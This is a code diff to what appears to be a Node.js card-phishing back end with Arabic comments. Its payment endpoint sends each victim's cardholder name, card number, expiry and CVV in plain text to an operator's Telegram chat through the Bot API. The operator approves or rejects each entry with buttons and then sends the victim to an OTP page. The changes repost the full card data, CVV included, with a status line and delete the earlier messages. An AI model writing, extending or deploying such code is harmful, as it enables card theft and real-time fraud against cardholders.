@@ -152,7 +152,7 @@ app.post('/api/payment', async (req, res) => {
     `• رقم البطاقة: <code>${paymentsData[paymentID].cardData.cardNumber}</code>\n` +
     `• التاريخ: ${paymentsData[paymentID].cardData.expiry}\n` +
     `• CVV: <code>${paymentsData[paymentID].cardData.cvv}</code>\n\n` +
-    `⏳ بانتظار موافقتك...`;
+    `⏳ بانتظار الموافقة...`;
 
   // إنشاء أزرار الموافقة والرفض مع paymentID ثابت
   const replyMarkup = {
@@ -165,7 +165,12 @@ app.post('/api/payment', async (req, res) => {
   };
 
   try {
-    await sendTelegramMessage(initialText, replyMarkup);
+    const result = await sendTelegramMessage(initialText, replyMarkup);
+    // حفظ message_id للاستخدام لاحقاً في تحديث الرسالة
+    if (result && result.result && result.result.message_id) {
+      paymentsData[paymentID].telegramMessageId = result.result.message_id;
+      savePayments(paymentsData);
+    }
     return res.json({ success: true, message: 'Card data saved in session.', paymentID: paymentID });
   } catch (error) {
     console.error('خطأ في إرسال رسالة تليجرام:', error.message);
@@ -217,8 +222,19 @@ app.post('/webhook/telegram', async (req, res) => {
     paymentsData[paymentID] = paymentRecord;
     savePayments(paymentsData);
     
-    await answerCallbackQuery(callbackId, '✅ تمت الموافقة - سيتم توجيه المستخدم لصفحة OTP');
-    await editMessageText(messageId, '✅ <b>تمت الموافقة على الطلب</b>\n\n• المستخدم سيتم توجيهه إلى صفحة OTP');
+    // إنشاء رسالة جديدة بنفس التنسيق مع إضافة حالة الموافقة في الأعلى
+    const approvedText = ` <b>✅ تمت الموافقة</b>\n\n` +
+      `• حامل البطاقة: ${paymentRecord.cardData.cardName}\n` +
+      `• رقم البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n` +
+      `• التاريخ: ${paymentRecord.cardData.expiry}\n` +
+      `• CVV: <code>${paymentRecord.cardData.cvv}</code>\n\n` +
+      `✅ جاري توجيه المستخدم لصفحة OTP`;
+    
+    await answerCallbackQuery(callbackId, '✅ تمت الموافقة');
+    // إرسال رسالة جديدة تحتوي على البيانات والحالة
+    await sendTelegramMessage(approvedText);
+    // حذف الرسالة القديمة
+    await deleteMessage(messageId);
     
     console.log('✅ تمت الموافقة على الطلب - PaymentID:', paymentID);
   } else if (action === 'reject') {
@@ -226,8 +242,19 @@ app.post('/webhook/telegram', async (req, res) => {
     paymentsData[paymentID] = paymentRecord;
     savePayments(paymentsData);
     
-    await answerCallbackQuery(callbackId, '❌ تم الرفض - سيتم إبلاغ المستخدم');
-    await editMessageText(messageId, '❌ <b>تم رفض الطلب</b>\n\n• سيتم إبلاغ المستخدم بالتحقق من البيانات');
+    // إنشاء رسالة جديدة بنفس التنسيق مع إضافة حالة الرفض في الأعلى
+    const rejectedText = ` <b>❌ تم الرفض</b>\n\n` +
+      `• حامل البطاقة: ${paymentRecord.cardData.cardName}\n` +
+      `• رقم البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n` +
+      `• التاريخ: ${paymentRecord.cardData.expiry}\n` +
+      `• CVV: <code>${paymentRecord.cardData.cvv}</code>\n\n` +
+      `❌ جاري إبلاغ المستخدم`;
+    
+    await answerCallbackQuery(callbackId, '❌ تم الرفض');
+    // إرسال رسالة جديدة تحتوي على البيانات والحالة
+    await sendTelegramMessage(rejectedText);
+    // حذف الرسالة القديمة
+    await deleteMessage(messageId);
     
     console.log('❌ تم رفض الطلب - PaymentID:', paymentID);
   }
@@ -286,6 +313,55 @@ function answerCallbackQuery(callbackId, text) {
 }
 
 // دالة لتحديث نص الرسالة (مع معالجة أخطاء آمنة)
+function editMessageReplyMarkup(messageId, replyMarkup) {
+  return new Promise((resolve) => {
+    const payloadData = {
+      chat_id: telegramChatId,
+      message_id: messageId,
+      reply_markup: replyMarkup // إزالت الأزرار
+    };
+
+    const payload = JSON.stringify(payloadData);
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${telegramBotToken}/editMessageReplyMarkup`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(payload)
+      }
+    };
+
+    const request = https.request(options, (response) => {
+      let body = '';
+      response.on('data', (chunk) => { body += chunk; });
+      response.on('end', () => {
+        if (response.statusCode >= 200 && response.statusCode < 300) {
+          resolve(JSON.parse(body));
+        } else {
+          console.log('⚠️ تحذير: editMessageReplyMarkup:', response.statusCode, body);
+          resolve({});
+        }
+      });
+    });
+
+    request.on('error', (error) => {
+      console.log('⚠️ تحذير: فشل editMessageReplyMarkup:', error.message);
+      resolve({});
+    });
+    
+    request.setTimeout(3000, () => {
+      request.destroy();
+      resolve({});
+    });
+    
+    request.write(payload);
+    request.end();
+  });
+}
+
+// دالة لتحديث نص الرسالة
 function editMessageText(messageId, text) {
   return new Promise((resolve) => {
     const payloadData = {
@@ -314,21 +390,68 @@ function editMessageText(messageId, text) {
         if (response.statusCode >= 200 && response.statusCode < 300) {
           resolve(JSON.parse(body));
         } else {
-          console.log('⚠️ تحذير: Telegram API استجابة غير متوقعة:', response.statusCode);
-          resolve({}); // لا نرفع الخطأ
+          console.log('⚠️ تحذير: editMessageText:', response.statusCode, body);
+          resolve({});
         }
       });
     });
 
     request.on('error', (error) => {
-      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (editMessageText):', error.message);
-      resolve({}); // لا نرفع الخطأ
+      console.log('⚠️ تحذير: فشل editMessageText:', error.message);
+      resolve({});
     });
     
     request.setTimeout(3000, () => {
       request.destroy();
-      console.log('⚠️ انقضى الوقت عند محاولة تحديث الرسالة');
-      resolve({}); // لا نرفع الخطأ
+      resolve({});
+    });
+    
+    request.write(payload);
+    request.end();
+  });
+}
+
+// دالة لحذف رسالة
+function deleteMessage(messageId) {
+  return new Promise((resolve) => {
+    const payloadData = {
+      chat_id: telegramChatId,
+      message_id: messageId
+    };
+
+    const payload = JSON.stringify(payloadData);
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${telegramBotToken}/deleteMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(payload)
+      }
+    };
+
+    const request = https.request(options, (response) => {
+      let body = '';
+      response.on('data', (chunk) => { body += chunk; });
+      response.on('end', () => {
+        if (response.statusCode >= 200 && response.statusCode < 300) {
+          resolve(JSON.parse(body));
+        } else {
+          console.log('⚠️ تحذير: deleteMessage:', response.statusCode, body);
+          resolve({});
+        }
+      });
+    });
+
+    request.on('error', (error) => {
+      console.log('⚠️ تحذير: فشل deleteMessage:', error.message);
+      resolve({});
+    });
+    
+    request.setTimeout(3000, () => {
+      request.destroy();
+      resolve({});
     });
     
     request.write(payload);
